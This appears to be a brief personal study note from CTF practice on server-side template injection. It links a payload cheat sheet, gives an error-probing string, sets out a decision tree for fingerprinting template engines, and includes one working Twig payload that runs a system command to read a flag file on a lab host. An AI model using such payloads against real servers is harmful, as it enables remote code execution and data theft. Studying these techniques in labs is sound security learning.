MAY NEED TO REMOVE WHITE SPACES

**SSTI Cheat sheet for Payloads**
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md


String of characters which should result in an error if present
```txt
${{<%[%'"}}%\.
```


Can be passed as a parameter, not just physical form on website.

api=http://truckapi.htb/?id%3D{{['cat\x20/flag.txt']|filter('system')}}



Determining the type of template engine running
![[Pasted image 20260218130959.png]]

${7*7}
 ├─ Works → a{*comment*}b
 │        ├─ Works → Smarty
 │        └─ Fails → ${"z".join("ab")}
 │                  ├─ Works → Mako
 │                  └─ Fails → Unknown
 │
 └─ Fails → {{7*7}}
           ├─ Works → Jinja2 / Twig
           └─ Fails → Not vulnerable

